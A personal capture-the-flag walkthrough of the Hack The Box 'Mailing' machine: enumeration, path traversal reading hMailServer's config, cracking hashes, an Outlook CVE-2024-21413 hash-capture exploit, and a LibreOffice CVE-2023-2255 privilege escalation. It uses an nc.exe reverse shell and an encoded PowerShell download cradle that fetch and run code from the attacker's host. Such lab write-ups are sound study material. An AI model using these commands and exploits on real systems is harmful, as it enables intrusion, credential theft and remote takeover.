# Reconnaissance
## Nmap Enumeration
- we pass the commands (we did udp but it shoed all open filtered as windows usually doesnt respond with icmp so nmap assumes its open/filtered):
```bash
nmap -sV -sC -vv 10.10.11.14

---OUTPUT---
PORT    STATE SERVICE       REASON          VERSION
25/tcp  open  smtp          syn-ack ttl 127 hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp open  pop3          syn-ack ttl 127 hMailServer pop3d
|_pop3-capabilities: UIDL TOP USER
135/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
143/tcp open  imap          syn-ack ttl 127 hMailServer imapd
|_imap-capabilities: RIGHTS=texkA0001 ACL SORT CAPABILITY CHILDREN completed IMAP4 OK IMAP4rev1 IDLE QUOTA NAMESPACE
445/tcp open  microsoft-ds? syn-ack ttl 127
465/tcp open  ssl/smtp      syn-ack ttl 127 hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
| -----BEGIN CERTIFICATE-----
| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
|_-----END CERTIFICATE-----
587/tcp open  smtp          syn-ack ttl 127 hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
| -----BEGIN CERTIFICATE-----
| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
|_-----END CERTIFICATE-----
993/tcp open  ssl/imap      syn-ack ttl 127 hMailServer imapd
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: RIGHTS=texkA0001 ACL SORT CAPABILITY CHILDREN completed IMAP4 OK IMAP4rev1 IDLE QUOTA NAMESPACE
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32:df3f:1d16:08b8:99d2:e39b:6467:297e
| SHA-1: 5c3e:5265:c5bc:68ab:aaac:0d8f:ab8d:90b4:7895:a3d7
| -----BEGIN CERTIFICATE-----
| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
|_-----END CERTIFICATE-----
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 29452/tcp): CLEAN (Timeout)
|   Check 2 (port 40371/tcp): CLEAN (Timeout)
|   Check 3 (port 37492/udp): CLEAN (Timeout)
|   Check 4 (port 47127/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-04-08T11:35:09
|_  start_date: N/A
|_clock-skew: 1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```
- **25, 587 : SMTP** : Originally 25 was main port but now 587 is used
- We see domain name mailing.htb
- 993 : SSL/IMAP
```bash
# For all SSL Ports
ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
		| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/localityName=Madrid/emailAddress=ruy@mailing.htb/organizationalUnitName=MAILING
```
- 465 : SSL/SMTP
- 445 : microsoft-ds?
- 143 : IMAP
- 139 : netbios/SMB
- 135 : MSRPC
- 110 : POP3
- 80 : HTTP : Can access a website
## Directory Enumeration
- Gobuster (also added -x php to find more php flag's after finding download.php):
```bash
gobuster dir -u http://mailing.htb dns -x php --wordlist /usr/share/wordlists/dirb/big.txt -o gobuster.root

---OUTPUT---
/Download.php         (Status: 200) [Size: 31]
/Index.php            (Status: 200) [Size: 4681]
/assets               (Status: 301) [Size: 160] [--> http://mailing.htb/assets/]
/download.php         (Status: 200) [Size: 31]
/index.php            (Status: 200) [Size: 4681]
/instructions         (Status: 301) [Size: 166] [--> http://mailing.htb/instructions/]
```
- No output for ffuf:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://mailing.htb/ -H 'Host: FUZZ.mailing.htb' -fs 4681

---OUTPUT---
Nothing of value..
```

## Website Enumeration

### Direct
- website url changed to mailing.htb when trying to access 10.10.11.14
- add to /etc/hosts
- uses hMailServer
- File Inclusion vulnerability found online
- link to download pdf:
- http://mailing.htb/download.php?file=instructions.pdf
- 3 teams with 3 names:
- Ruy Alonso - IT Team
- Maya Bendito - Support Team
- Gregory Smith - Founder and CEO

### Via BurpSuite (Exploiting Directory Traversal Vulnerability)
- We test for path traversal
- Windows host file:
- ..\..\Windows\System32\drivers\etc\hosts
			![[Pasted image 20250408080818.png]]
- The GET Request:
```bash
GET /download.php?file=..\..\Windows\System32\drivers\etc\hosts HTTP/1.1
Host: mailing.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://mailing.htb/index.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i


---MAIN-OUTPUT---
127.0.0.1	mailing.htb
```
- We check for config file location for hMailServer
- Google "hMailServer config file location"
- In an hMailServer forum post
```bash
c:\program files (x86\hMailServer\Bin\hMailServer.ini
```
- We try it on BurpSuite
- Send a GET Request to config file location:
```bash
GET /download.php?file=..\..\Program+Files+(x86)\hMailServer\Bin\hMailServer.ini HTTP/1.1
Host: mailing.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://mailing.htb/index.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i


---OUTPUT---
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```
- ca use Progra~2 for x86 and Progra~1 for normal instead of dealing with spaces
- Administrator Password : `841bb5acfa6779ae432fd7a4e6600ba7`
- MSSQL
- Using crackstation.net
- Password: homenetworkingadministrator
## Initial Foothold
- We know there is a mail server running
- So there must be a mail client
- By default in Windows it's Windows Mail (also shown in the instructions pdf)
- On searching for exploits we find:
- https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
- Run smbserver on directory with
```bash
impacket-smbserver smbFolder $(pwd) -smb2support

OR

sudo responder -I tun0


---OUTPUT-AFTER-EXPLOIT---
[*] Incoming connection (10.10.11.14,56481)
[*] AUTHENTICATE_MESSAGE (MAILING\maya,MAILING)
[*] User MAILING\maya authenticated successfully
[*] maya::MAILING:aaaaaaaaaaaaaaaa:b02349cc429417426581536813713c85:01010000000000000079420ea1a8db01f91334e1fe3028a800000000010010005a00610046006f006400650075007100030010005a00610046006f00640065007500710002001000720063004f00760056006a006900590004001000720063004f00760056006a0069005900070008000079420ea1a8db01060004000200000008003000300000000000000000000000002000006896629cd37c6ec72f4970fef610ade3b1491047a428afd52ef768294fcad7730a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320035000000000000000000
[*] Connecting Share(1:IPC$)
[-] SMB2_TREE_CONNECT not found test
[-] SMB2_TREE_CONNECT not found test
[*] NetrGetShareInfo Level: 1
[-] SMB2_TREE_CONNECT not found test
[-] SMB2_TREE_CONNECT not found test
[*] NetrShareEnum Level: 1
```
- Execute exploit:
```bash
python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password 'homenetworkingadministrator' --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.25\test\meeting" --subject Test

---OUTPUT---
CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
Alexander Hagenah / @xaitax / ah@primepage.de                                                          

✅ Email sent successfully.
```
- We get a NTLMv2 hash
- We attempt to crack it with hashcat
```bash
vi maya.ntlmv2 # Copy the hash
hashcat maya.ntlmv2 /usr/share/wordlists/rockyou.txt

---OUTPUT---
MAYA::MAILING:aaaaaaaaaaaaaaaa:e6c06f19a87893ab8c7da4d906876af0:01010000000000008063c539a1a8db01ac9ee1f8cf2107f100000000010010005a00610046006f006400650075007100030010005a00610046006f00640065007500710002001000720063004f00760056006a006900590004001000720063004f00760056006a0069005900070008008063c539a1a8db01060004000200000008003000300000000000000000000000002000006896629cd37c6ec72f4970fef610ade3b1491047a428afd52ef768294fcad7730a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320035000000000000000000:m4y4ngs4ri
```
- Password: m4y4ngs4ri
- evil-winrm into machine:
```bash
evil-winrm -u maya -p m4y4ngs4ri -i mailing.htb
```
- We gain user flag
## Privilege Escalation
- Under Program Files we find LibreOffice and we find version:
```bash
cd C:\Progra~1
dir
cd LibreOffice
dir
cd program
type version.ini

---OUTPUT-VERSION---
MsiProductVersion=7.4.0.1
```
- On searching google we find
- https://github.com/elweth-sec/CVE-2023-2255
- We exploit the script.
- Two ways:
- Netcat
- Make sure you win-rm on the location where the files you need are at or specify the full path:
```bash
---ON-LOCAL-MACHINE---
cd CVE-2023-2255
python3 CVE-2023-2255.py --cmd "cmd.exe /c C:\ProgramData\nc.exe -e cmd.exe 10.10.14.25 9999" --output exploit.odt
cp exploit.odt ../
cd ..
cp cp /usr/share/windows-resources/binaries/nc.exe .
nc -lvnp 9999
---ON-TARGET---
cd "C:\programdata"
upload nc.exe
cd "C:\Important Documents"
upload exploit.odt
```
- We gain localadmin user access
- Create a cradle
- The basic idea is we create a script that calls to download our reverse shell and execute it
- That script which is our payload (which calls our actual payload from our local machine) is called a cradle
- We encrypt it using utf-16le and base64 for windows to read it more easily
```bash
vi cradle
> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8001/shell.ps1')
cat cradle | iconv --to-code utf-16le |base64 -w 0

---OUTPUT---
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIANQA6ADgAMAAwADEALwBzAGgAZQBsAGwALgBwAHMAMQAnACkACgA=
```
- Say we get a response on http server but no reverse shell
- Could imply AntiVirus at play 
- Then we execute our exploit (we use TCP One Liner reverse shell script)
```bash
cp /opt/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 shell.ps1
vi shell.ps1 # edit to put our ip and port ($client...)
python3 -m http.server 8001
```
- We create our exploit and open our netcat listener
```bash
cd CVE-2023-2255
python3 CVE-2023-2255.py --cmd "cmd /c powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIANQA6ADgAMAAwADEALwBzAGgAZQBsAGwALgBwAHMAMQAnACkACgA=" --output exploit2.odt
cp exploit2.odt ../exploit2.odt
nc -lvnp 9998
```
- And then we upload it on our target:
```bash
cd "C:\Important Documents"
upload exploit2.odt
```
- We should gain localadmin user access on our listener in a few minutes (assuming someone opens our file just like how we got maya's credentials)
--------------
------
## Notes
- nxc smb <ip>
- nxc smv <ip> --shares
- nxc smb <ip> -u '' -p '' --shares
- 